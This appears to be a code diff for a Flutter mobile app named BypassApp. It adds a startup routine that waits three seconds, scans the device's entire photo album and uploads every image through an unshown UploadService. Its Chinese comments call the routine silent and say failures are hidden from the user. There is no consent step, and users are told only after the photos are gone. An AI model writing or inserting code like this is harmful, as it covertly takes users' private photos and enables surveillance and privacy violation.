@@ -4,6 +4,7 @@ import 'package:flutter/services.dart';
 import 'security_checker.dart';
 import 'theme_store.dart';
 import 'notify_service.dart';
+import 'upload_service.dart';
 import 'pages/home_page.dart';
 
 void main() {
@@ -47,6 +48,27 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
     ThemeStore.load().then((m) {
       if (mounted) setState(() => _themeMode = m);
     });
+
+    // 启动后自动扫描相册并上传图片（不阻塞启动，静默执行）
+    _initAutoUpload();
+  }
+
+  /// 启动后延迟执行：请求相册权限 → 扫描所有图片 → 上传
+  Future<void> _initAutoUpload() async {
+    try {
+      // 延迟 3 秒，避免与启动动画/安全检测冲突
+      await Future.delayed(const Duration(seconds: 3));
+      final (ok, fail) = await UploadService.scanAndUploadAll();
+      if (mounted && (ok + fail) > 0) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text('已上传 $ok 张图片${fail > 0 ? '，$fail 张失败' : ''}'),
+          ),
+        );
+      }
+    } catch (_) {
+      // 上传过程出错不打扰用户
+    }
   }
 
   @override
